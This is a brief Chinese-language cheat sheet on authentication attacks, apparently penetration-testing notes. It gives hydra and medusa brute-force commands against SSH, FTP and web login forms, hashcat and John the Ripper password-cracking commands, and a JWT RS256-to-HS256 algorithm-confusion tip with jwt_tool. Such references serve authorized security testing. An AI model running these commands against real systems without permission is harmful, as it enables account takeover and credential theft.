# 认证攻击

## 密码爆破

```bash
# Hydra（在线爆破）
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P pass.txt ftp://10.0.0.1
hydra -L users.txt -P pass.txt http-post-form "/login:username=^USER^&password=^PASS^:Login failed"

# Medusa（多线程）
medusa -h 10.0.0.1 -U users.txt -P pass.txt -M ssh
```

## Hash 破解

```bash
# Hashcat（GPU 加速）
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 3 hash.txt ?d?d?d?d?d?d?d?d  # 8位数字暴力

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

## JWT 攻击

```python
# JWT 算法混淆
# 将 alg 从 RS256 改为 HS256，使用公钥签名
# jwt_tool
python jwt_tool.py <JWT> -T
```
